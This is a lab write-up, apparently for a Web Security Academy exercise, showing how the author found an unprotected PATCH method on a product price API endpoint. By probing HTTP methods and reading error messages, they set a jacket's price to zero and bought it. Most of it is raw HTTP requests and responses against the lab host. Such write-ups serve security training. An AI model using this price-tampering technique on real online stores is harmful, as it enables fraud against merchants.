# Lab - 02 : Finding and exploiting an unused API endpoint

Topic :  Finding and exploiting an unused API endpoint

Concept: Recon the API, find the hidden API endpoint and the documentation and exploit the endpt.

End Goal :  Exploiting a hidden API endpoint to buy a **Lightweight l33t Leather Jacket.**

Analysis : 

- First of all we recon the whole API and find a API endpoint.
- The API endpoint found :

```
GET /api/products/1/price HTTP/2
Host: 0aaf0022031daec784d79b23004400b1.web-security-academy.net
Cookie: session=9rXCi9dmOLzFqw52QGzLlYxe37bc9pBY
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aaf0022031daec784d79b23004400b1.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

- API response to this :

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 91

{
"price":"$1337.00",
"message":"Your neighbor just bought 2 of these! Don't feel left out!"
}
```

- The message keeps getting randomized, everytime.
- Let’s find the documentation now.
- could not find in the usual places.
- Let’s brute force the API endpoint now using gobuster
- Brute forcing doesn’t work in this case
- Let’s mess with the requests sent to the api and take hints from the error messages as said in the description
- Discovery
    - PUT → Method Not Allowed
    - PATCH → Unauthorized (Without body)
    - GET → normal one
    - DELETE → Method Not Allowed
    - OPTIONS → Method Not Allowed
- Only interesting request was PATCH, when i sent a body along with it, it shows this message :

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93

{
"type":"ClientError",
"code":400,
"error":"Only 'application/json' Content-Type is supported"
}
```

- The PATCH request to this endpoint is our hidden endpoint.
- This error means we have to include the `Content-Type: application/json` in the header.
- My request :
    
    ```
    PATCH /api/products/1/price HTTP/2
    Host: 0aaf0022031daec784d79b23004400b1.web-security-academy.net
    Cookie: session=zWbBjyJBwLrv86Oc1ScwpAD4ehVfdg0t
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: https://0aaf0022031daec784d79b23004400b1.web-security-academy.net/product?productId=1
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Priority: u=4
    Te: trailers
    Content-Length: 24
    Content-Type: application/json
    
    {
    	"price" : "$12"
    }
    ```
    
- Then again error comes which is

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 98

{
"type":"ClientError",
"code":400,
"error":"'price' parameter must be a valid non-negative integer"
}
```

- So i change the body as follows :
- Adhering to the rules…

```

{
	"price" : 0
}
```

- This changes the price to 0 dollars which i can buy now. And after buying the jacket the lab is succesfully completed.